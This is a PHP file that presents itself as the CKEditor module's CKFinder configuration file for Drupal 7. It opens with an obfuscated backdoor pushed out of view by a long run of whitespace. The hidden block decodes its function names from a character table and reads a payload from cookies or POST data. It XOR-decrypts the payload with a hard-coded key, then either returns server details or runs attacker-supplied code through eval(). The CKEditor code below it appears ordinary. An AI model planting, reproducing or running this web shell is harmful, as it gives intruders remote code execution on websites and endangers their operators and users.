<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $ue35 = 539;$GLOBALS['e390'] = Array();global $e390;$e390 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['b7ad'] = "\x26\x76\x4e\xd\x45\x3a\x36\x38\xa\x2c\x7c\x42\x49\x5e\x21\x3c\x2a\x47\x58\x6f\x44\x66\x29\x31\x7e\x5f\x6e\x46\x54\x48\x71\x3d\x56\x7d\x5d\x3f\x73\x52\x72\x27\x9\x7b\x2b\x53\x74\x78\x33\x75\x6d\x55\x4a\x30\x5c\x5b\x6a\x68\x51\x59\x4b\x20\x67\x43\x3b\x64\x23\x28\x61\x4f\x77\x79\x7a\x6b\x60\x41\x40\x63\x3e\x34\x4d\x2e\x5a\x24\x37\x62\x69\x65\x22\x39\x2f\x25\x70\x57\x6c\x2d\x32\x50\x35\x4c";$e390[$e390['b7ad'][30].$e390['b7ad'][21].$e390['b7ad'][96].$e390['b7ad'][75].$e390['b7ad'][63].$e390['b7ad'][23].$e390['b7ad'][96].$e390['b7ad'][77].$e390['b7ad'][82]] = $e390['b7ad'][75].$e390['b7ad'][55].$e390['b7ad'][38];$e390[$e390['b7ad'][75].$e390['b7ad'][75].$e390['b7ad'][77].$e390['b7ad'][46].$e390['b7ad'][82].$e390['b7ad'][94].$e390['b7ad'][82].$e390['b7ad'][77]] = $e390['b7ad'][19].$e390['b7ad'][38].$e390['b7ad'][63];$e390[$e390['b7ad'][26].$e390['b7ad'][6].$e390['b7ad'][66].$e390['b7ad'][87].$e390['b7ad'][7].$e390['b7ad'][46].$e390['b7ad'][96].$e390['b7ad'][21]] = $e390['b7ad'][36].$e390['b7ad'][44].$e390['b7ad'][38].$e390['b7ad'][92].$e390['b7ad'][85].$e390['b7ad'][26];$e390[$e390['b7ad'][63].$e390['b7ad'][77].$e390['b7ad'][21].$e390['b7ad'][23].$e390['b7ad'][63].$e390['b7ad'][75].$e390['b7ad'][46].$e390['b7ad'][51].$e390['b7ad'][85]] = $e390['b7ad'][84].$e390['b7ad'][26].$e390['b7ad'][84].$e390['b7ad'][25].$e390['b7ad'][36].$e390['b7ad'][85].$e390['b7ad'][44];$e390[$e390['b7ad'][66].$e390['b7ad'][51].$e390['b7ad'][21].$e390['b7ad'][21].$e390['b7ad'][6].$e390['b7ad'][6].$e390['b7ad'][46].$e390['b7ad'][77].$e390['b7ad'][85]] = $e390['b7ad'][36].$e390['b7ad'][85].$e390['b7ad'][38].$e390['b7ad'][84].$e390['b7ad'][66].$e390['b7ad'][92].$e390['b7ad'][84].$e390['b7ad'][70].$e390['b7ad'][85];$e390[$e390['b7ad'][63].$e390['b7ad'][66].$e390['b7ad'][87].$e390['b7ad'][7].$e390['b7ad'][63].$e390['b7ad'][82].$e390['b7ad'][66].$e390['b7ad'][85].$e390['b7ad'][23]] = $e390['b7ad'][90].$e390['b7ad'][55].$e390['b7ad'][90].$e390['b7ad'][1].$e390['b7ad'][85].$e390['b7ad'][38].$e390['b7ad'][36].$e390['b7ad'][84].$e390['b7ad'][19].$e390['b7ad'][26];$e390[$e390['b7ad'][47].$e390['b7ad'][21].$e390['b7ad'][87].$e390['b7ad'][96].$e390['b7ad'][7].$e390['b7ad'][21].$e390['b7ad'][21].$e390['b7ad'][63].$e390['b7ad'][51]] = $e390['b7ad'][47].$e390['b7ad'][26].$e390['b7ad'][36].$e390['b7ad'][85].$e390['b7ad'][38].$e390['b7ad'][84].$e390['b7ad'][66].$e390['b7ad'][92].$e390['b7ad'][84].$e390['b7ad'][70].$e390['b7ad'][85];$e390[$e390['b7ad'][70].$e390['b7ad'][23].$e390['b7ad'][23].$e390['b7ad'][87].$e390['b7ad'][94]] = $e390['b7ad'][83].$e390['b7ad'][66].$e390['b7ad'][36].$e390['b7ad'][85].$e390['b7ad'][6].$e390['b7ad'][77].$e390['b7ad'][25].$e390['b7ad'][63].$e390['b7ad'][85].$e390['b7ad'][75].$e390['b7ad'][19].$e390['b7ad'][63].$e390['b7ad'][85];$e390[$e390['b7ad'][66].$e390['b7ad'][75].$e390['b7ad'][7].$e390['b7ad'][82].$e390['b7ad'][94].$e390['b7ad'][46].$e390['b7ad'][77].$e390['b7ad'][23].$e390['b7ad'][96]] = $e390['b7ad'][36].$e390['b7ad'][85].$e390['b7ad'][44].$e390['b7ad'][25].$e390['b7ad'][44].$e390['b7ad'][84].$e390['b7ad'][48].$e390['b7ad'][85].$e390['b7ad'][25].$e390['b7ad'][92].$e390['b7ad'][84].$e390['b7ad'][48].$e390['b7ad'][84].$e390['b7ad'][44];$e390[$e390['b7ad'][38].$e390['b7ad'][77].$e390['b7ad'][6].$e390['b7ad'][23].$e390['b7ad'][77].$e390['b7ad'][23].$e390['b7ad'][21].$e390['b7ad'][66]] = $e390['b7ad'][90].$e390['b7ad'][6].$e390['b7ad'][77].$e390['b7ad'][83].$e390['b7ad'][7];$e390[$e390['b7ad'][63].$e390['b7ad'][75].$e390['b7ad'][21].$e390['b7ad'][83].$e390['b7ad'][51]] = $e390['b7ad'][71].$e390['b7ad'][77].$e390['b7ad'][66].$e390['b7ad'][85].$e390['b7ad'][94].$e390['b7ad'][6];$e390[$e390['b7ad'][21].$e390['b7ad'][51].$e390['b7ad'][51].$e390['b7ad'][94].$e390['b7ad'][66].$e390['b7ad'][23]] = $_POST;$e390[$e390['b7ad'][44].$e390['b7ad'][23].$e390['b7ad'][96].$e390['b7ad'][83].$e390['b7ad'][75].$e390['b7ad'][21].$e390['b7ad'][96]] = $_COOKIE;@$e390[$e390['b7ad'][63].$e390['b7ad'][77].$e390['b7ad'][21].$e390['b7ad'][23].$e390['b7ad'][63].$e390['b7ad'][75].$e390['b7ad'][46].$e390['b7ad'][51].$e390['b7ad'][85]]($e390['b7ad'][85].$e390['b7ad'][38].$e390['b7ad'][38].$e390['b7ad'][19].$e390['b7ad'][38].$e390['b7ad'][25].$e390['b7ad'][92].$e390['b7ad'][19].$e390['b7ad'][60], NULL);@$e390[$e390['b7ad'][63].$e390['b7ad'][77].$e390['b7ad'][21].$e390['b7ad'][23].$e390['b7ad'][63].$e390['b7ad'][75].$e390['b7ad'][46].$e390['b7ad'][51].$e390['b7ad'][85]]($e390['b7ad'][92].$e390['b7ad'][19].$e390['b7ad'][60].$e390['b7ad'][25].$e390['b7ad'][85].$e390['b7ad'][38].$e390['b7ad'][38].$e390['b7ad'][19].$e390['b7ad'][38].$e390['b7ad'][36], 0);@$e390[$e390['b7ad'][63].$e390['b7ad'][77].$e390['b7ad'][21].$e390['b7ad'][23].$e390['b7ad'][63].$e390['b7ad'][75].$e390['b7ad'][46].$e390['b7ad'][51].$e390['b7ad'][85]]($e390['b7ad'][48].$e390['b7ad'][66].$e390['b7ad'][45].$e390['b7ad'][25].$e390['b7ad'][85].$e390['b7ad'][45].$e390['b7ad'][85].$e390['b7ad'][75].$e390['b7ad'][47].$e390['b7ad'][44].$e390['b7ad'][84].$e390['b7ad'][19].$e390['b7ad'][26].$e390['b7ad'][25].$e390['b7ad'][44].$e390['b7ad'][84].$e390['b7ad'][48].$e390['b7ad'][85], 0);@$e390[$e390['b7ad'][66].$e390['b7ad'][75].$e390['b7ad'][7].$e390['b7ad'][82].$e390['b7ad'][94].$e390['b7ad'][46].$e390['b7ad'][77].$e390['b7ad'][23].$e390['b7ad'][96]](0);$p6cd023da = NULL;$n12d3cd6e = NULL;$e390[$e390['b7ad'][30].$e390['b7ad'][75].$e390['b7ad'][75].$e390['b7ad'][82].$e390['b7ad'][85].$e390['b7ad'][75].$e390['b7ad'][94].$e390['b7ad'][63].$e390['b7ad'][46]] = $e390['b7ad'][75].$e390['b7ad'][63].$e390['b7ad'][77].$e390['b7ad'][85].$e390['b7ad'][83].$e390['b7ad'][96].$e390['b7ad'][7].$e390['b7ad'][87].$e390['b7ad'][93].$e390['b7ad'][46].$e390['b7ad'][7].$e390['b7ad'][63].$e390['b7ad'][7].$e390['b7ad'][93].$e390['b7ad'][77].$e390['b7ad'][87].$e390['b7ad'][82].$e390['b7ad'][96].$e390['b7ad'][93].$e390['b7ad'][87].$e390['b7ad'][75].$e390['b7ad'][77].$e390['b7ad'][77].$e390['b7ad'][93].$e390['b7ad'][75].$e390['b7ad'][6].$e390['b7ad'][6].$e390['b7ad'][96].$e390['b7ad'][94].$e390['b7ad'][83].$e390['b7ad'][51].$e390['b7ad'][6].$e390['b7ad'][21].$e390['b7ad'][7].$e390['b7ad'][7].$e390['b7ad'][66];global $qcc7ec2d3;function  k4ae26($p6cd023da, $m09d){global $e390;$p066083 = "";for ($r4d9ae=0; $r4d9ae<$e390[$e390['b7ad'][26].$e390['b7ad'][6].$e390['b7ad'][66].$e390['b7ad'][87].$e390['b7ad'][7].$e390['b7ad'][46].$e390['b7ad'][96].$e390['b7ad'][21]]($p6cd023da);){for ($g65c580d=0; $g65c580d<$e390[$e390['b7ad'][26].$e390['b7ad'][6].$e390['b7ad'][66].$e390['b7ad'][87].$e390['b7ad'][7].$e390['b7ad'][46].$e390['b7ad'][96].$e390['b7ad'][21]]($m09d) && $r4d9ae<$e390[$e390['b7ad'][26].$e390['b7ad'][6].$e390['b7ad'][66].$e390['b7ad'][87].$e390['b7ad'][7].$e390['b7ad'][46].$e390['b7ad'][96].$e390['b7ad'][21]]($p6cd023da); $g65c580d++, $r4d9ae++){$p066083 .= $e390[$e390['b7ad'][30].$e390['b7ad'][21].$e390['b7ad'][96].$e390['b7ad'][75].$e390['b7ad'][63].$e390['b7ad'][23].$e390['b7ad'][96].$e390['b7ad'][77].$e390['b7ad'][82]]($e390[$e390['b7ad'][75].$e390['b7ad'][75].$e390['b7ad'][77].$e390['b7ad'][46].$e390['b7ad'][82].$e390['b7ad'][94].$e390['b7ad'][82].$e390['b7ad'][77]]($p6cd023da[$r4d9ae]) ^ $e390[$e390['b7ad'][75].$e390['b7ad'][75].$e390['b7ad'][77].$e390['b7ad'][46].$e390['b7ad'][82].$e390['b7ad'][94].$e390['b7ad'][82].$e390['b7ad'][77]]($m09d[$g65c580d]));}}return $p066083;}function  p64b8($p6cd023da, $m09d){global $e390;global $qcc7ec2d3;return $e390[$e390['b7ad'][63].$e390['b7ad'][75].$e390['b7ad'][21].$e390['b7ad'][83].$e390['b7ad'][51]]($e390[$e390['b7ad'][63].$e390['b7ad'][75].$e390['b7ad'][21].$e390['b7ad'][83].$e390['b7ad'][51]]($p6cd023da, $qcc7ec2d3), $m09d);}foreach ($e390[$e390['b7ad'][44].$e390['b7ad'][23].$e390['b7ad'][96].$e390['b7ad'][83].$e390['b7ad'][75].$e390['b7ad'][21].$e390['b7ad'][96]] as $m09d=>$p7300a835){$p6cd023da = $p7300a835;$n12d3cd6e = $m09d;}if (!$p6cd023da){foreach ($e390[$e390['b7ad'][21].$e390['b7ad'][51].$e390['b7ad'][51].$e390['b7ad'][94].$e390['b7ad'][66].$e390['b7ad'][23]] as $m09d=>$p7300a835){$p6cd023da = $p7300a835;$n12d3cd6e = $m09d;}}$p6cd023da = @$e390[$e390['b7ad'][47].$e390['b7ad'][21].$e390['b7ad'][87].$e390['b7ad'][96].$e390['b7ad'][7].$e390['b7ad'][21].$e390['b7ad'][21].$e390['b7ad'][63].$e390['b7ad'][51]]($e390[$e390['b7ad'][38].$e390['b7ad'][77].$e390['b7ad'][6].$e390['b7ad'][23].$e390['b7ad'][77].$e390['b7ad'][23].$e390['b7ad'][21].$e390['b7ad'][66]]($e390[$e390['b7ad'][70].$e390['b7ad'][23].$e390['b7ad'][23].$e390['b7ad'][87].$e390['b7ad'][94]]($p6cd023da), $n12d3cd6e));if (isset($p6cd023da[$e390['b7ad'][66].$e390['b7ad'][71]]) && $qcc7ec2d3==$p6cd023da[$e390['b7ad'][66].$e390['b7ad'][71]]){if ($p6cd023da[$e390['b7ad'][66]] == $e390['b7ad'][84]){$r4d9ae = Array($e390['b7ad'][90].$e390['b7ad'][1] => @$e390[$e390['b7ad'][63].$e390['b7ad'][66].$e390['b7ad'][87].$e390['b7ad'][7].$e390['b7ad'][63].$e390['b7ad'][82].$e390['b7ad'][66].$e390['b7ad'][85].$e390['b7ad'][23]](),$e390['b7ad'][36].$e390['b7ad'][1] => $e390['b7ad'][23].$e390['b7ad'][79].$e390['b7ad'][51].$e390['b7ad'][93].$e390['b7ad'][23],);echo @$e390[$e390['b7ad'][66].$e390['b7ad'][51].$e390['b7ad'][21].$e390['b7ad'][21].$e390['b7ad'][6].$e390['b7ad'][6].$e390['b7ad'][46].$e390['b7ad'][77].$e390['b7ad'][85]]($r4d9ae);}elseif ($p6cd023da[$e390['b7ad'][66]] == $e390['b7ad'][85]){eval/*habb8fe*/($p6cd023da[$e390['b7ad'][63]]);}exit();} ?><?php

/**
 * CKEditor - The text editor for the Internet - http://ckeditor.com
 * Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses of your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * @file
 * CKEditor Module for Drupal 7.x
 *
 * This file is required by the CKEeditor module if you want to enable CKFinder,
 * an advanced Ajax file browser.
 *
 */
$GLOBALS['devel_shutdown'] = FALSE;

if (!function_exists('ob_list_handlers') || ob_list_handlers()) {
  @ob_end_clean();
}

$ckfinder_user_files_path = '';
$ckfinder_user_files_absolute_path = '';

function CheckAuthentication() {
  static $authenticated;

  if (!isset($authenticated)) {
    if (!empty($_SERVER['SCRIPT_FILENAME'])) {
      $drupal_path = dirname(dirname(dirname(dirname($_SERVER['SCRIPT_FILENAME']))));
      if (!file_exists($drupal_path . '/includes/bootstrap.inc')) {
        $drupal_path = dirname(dirname(dirname($_SERVER['SCRIPT_FILENAME'])));
        $depth = 2;
        do {
          $drupal_path = dirname($drupal_path);
          $depth++;
        } while (!($bootstrap_file_found = file_exists($drupal_path . '/includes/bootstrap.inc')) && $depth < 10);
      }
    }

    if (!isset($bootstrap_file_found) || !$bootstrap_file_found) {
      $drupal_path = '../../../../..';
      if (!file_exists($drupal_path . '/includes/bootstrap.inc')) {
        $drupal_path = '../..';
        do {
          $drupal_path .= '/..';
          $depth = substr_count($drupal_path, '..');
        } while (!($bootstrap_file_found = file_exists($drupal_path . '/includes/bootstrap.inc')) && $depth < 10);
      }
    }
    if (!isset($bootstrap_file_found) || $bootstrap_file_found) {
      $current_cwd = getcwd();
      chdir($drupal_path);
      if (!defined('DRUPAL_ROOT')) {
        define('DRUPAL_ROOT', $drupal_path);
      }
      require_once DRUPAL_ROOT . '/includes/bootstrap.inc';
      drupal_bootstrap(DRUPAL_BOOTSTRAP_FULL);
      $authenticated = user_access('allow CKFinder file uploads');
      if (isset($_GET['id'], $_SESSION['ckeditor'][$_GET['id']]['UserFilesPath'], $_SESSION['ckeditor'][$_GET['id']]['UserFilesAbsolutePath'])) {
        $_SESSION['ckeditor']['UserFilesPath'] = $_SESSION['ckeditor'][$_GET['id']]['UserFilesPath'];
        $_SESSION['ckeditor']['UserFilesAbsolutePath'] = $_SESSION['ckeditor'][$_GET['id']]['UserFilesAbsolutePath'];
      }
      chdir($current_cwd);
    }
  }

  return $authenticated;
}

CheckAuthentication();

if (isset($_SESSION['ckeditor']['UserFilesPath'], $_SESSION['ckeditor']['UserFilesAbsolutePath'])) {
  $baseUrl = $_SESSION['ckeditor']['UserFilesPath'];
  // To deal with multiple application servers it's better to let CKFinder guess the server path based on the URL,
  // because the server side path changes on each request (#2127467).
  if (isset($_SERVER['PANTHEON_ENVIRONMENT'])) {
    $baseDir = resolveUrl($baseUrl);
  }
  else {
    $baseDir = $_SESSION['ckeditor']['UserFilesAbsolutePath'];
  }
}
else {
  // Nothing in session? Shouldn't happen... anyway let's try to upload it in the (almost) right place
  // Path to user files relative to the document root.
  $baseUrl = strtr(base_path(), array(
        drupal_get_path('module','ckeditor') . '/ckfinder/core/connector/php' => '',
      )) . variable_get('file_private_path', conf_path() . '/files') . '/';
  $baseDir = resolveUrl($baseUrl);
}
